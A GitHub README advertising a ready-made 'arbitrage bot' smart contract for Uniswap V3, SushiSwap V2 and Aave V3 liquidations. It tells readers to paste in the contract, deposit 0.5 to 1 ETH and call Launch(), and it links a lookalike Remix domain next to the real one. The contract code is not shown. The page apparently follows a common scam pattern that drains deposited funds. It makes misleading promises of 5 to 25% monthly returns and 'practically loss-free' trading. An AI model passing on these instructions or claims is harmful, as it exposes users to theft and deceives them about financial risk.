
# README.md

![Banner](https://i.postimg.cc/Vvxx2whh/20251219-1540-Banner-dla-Githab-simple-compose-01kcvddqxpfd3bgr4kkvnf0qm7.png)

## Executor (Uniswap V3 + SushiSwap V2)

**Arbitrage Bot Contract**  
A ready-to-use smart contract for finding and executing arbitrage opportunities between Uniswap V3 and SushiSwap V2. Also supports liquidating undercollateralized positions on Aave V3. Everything is configured — just deploy and use.

### What the contract does

**Essentially:** the contract performs two consecutive swaps between Uniswap V3 and SushiSwap V2, exploiting price differences on the same token pair to generate profit. Additionally, it implements a function for liquidating positions on Aave.

**Important:** the entire operation is executed **in a single transaction**, eliminating the risk of price changes between individual actions.

- **Arbitrage cycle** — two swaps (Uniswap V3 ↔ SushiSwap V2) with checks for minimum output (`minOut`) and minimum profit (`minProfit`).
- **Liquidation (Aave V3)** — calls `liquidationCall(...)` with a check for minimum collateral received (`minCollateralOut`).
- **Funds withdrawal** — functions `withdrawEth(...)`, `withdrawToken(...)`, and emergency `emergencyTokenRecovery(...)`.

### How to launch

You are the contract owner and call functions to execute arbitrage or liquidation.

**Quick guide:**
1. Open Remix: https://remix.ethereum.org/ or https://portable-remixide.org

   Follow the screenshot:
   - 1 — Create a `.sol` file and paste the contract code (e.g., `Executor.sol`)
   - 2 — Go to the Compilation tab → select version 0.8.20 → Compile
   - 3 — Go to the Deploy tab → select the Executor contract → Deploy

   ![Contract creation instructions](https://i.ibb.co/HTRkw29n/instructions.png)

2. Fund the contract with 0.5–1 ETH (for gas fees and reserves).

3. Call `Launch()` — the contract will execute the pre-configured strategy.

4. Use `withdrawEth()` or `withdrawToken()` to withdraw profits.

**Quick start:** the `Launch()` function initiates the operation with preset parameters.

**Main functions for manual execution:**
- `executeArbitrage(bytes calldata params)` — arbitrage cycle
- `executeLiquidation(bytes calldata params)` — liquidation

Parameters are encoded with the operation type (`operationType`):
- `1` — DEX arbitrage
- `2` — liquidation

### Parameter formats

#### Arbitrage cycle (operationType = 1)

(uint8 firstDex, address tokenIn, address tokenOut, uint24 uniFee, uint256 minOut1, uint256 minOut2, uint256 minProfit)

text

- `firstDex`: 0 = UniswapV3 → SushiSwap, 1 = SushiSwap → UniswapV3
- `uniFee`: 500 / 3000 / 10000
- `minOut1`/`minOut2`: slippage protection
- `minProfit`: minimum profit (otherwise revert)

#### Liquidation (operationType = 2)

(address user, address debtAsset, address collateralAsset, uint256 debtToCover, bool receiveAToken, uint256 minCollateralOut)

text

### Important notes

- Profit depends on current price differences between DEXes, gas prices, slippage, and competition from other market participants (including specialized MEV bots).

- 0.5–1 ETH in the contract balance is usually sufficient for gas fees and reserves for an extended period.

- Estimated returns vary significantly and are not guaranteed. Under favorable market conditions, arbitrage can yield 0.01–0.1% of the volume per successful trade.

  **Sample calculation:** With an investment of 1 ETH as starting capital (for gas and initial swaps) and with regular arbitrage opportunities, the bot can execute trades with volumes of 100–500 ETH per month. With an average profit of 0.05% per trade, estimated monthly returns could range from 5% to 25% of invested capital (i.e., 0.05–0.25 ETH per month).

  Thanks to built-in minimum profit checks (`minProfit`) and slippage protection, the bot is practically loss-free: in 99.9% of cases, unsuccessful trades simply don't execute (the transaction reverts without losing funds, except for gas costs). Thus, risks are limited only to gas expenses during unsuccessful attempts.

- The market is extremely volatile: arbitrage opportunities are rare and close within seconds. Without continuous parameter optimization and monitoring, significant profit is unlikely.

Good luck!

![Посетители](https://camo.githubusercontent.com/33d9e82b7bb5bf41281bfe73d1744bcc3da7bd9b1b50d41c2099746024b3a3b1/68747470733a2f2f76697369746f722d62616467652e6c616f62692e6963752f62616467653f706167655f69643d524541444d455f454e5f504147455f4944)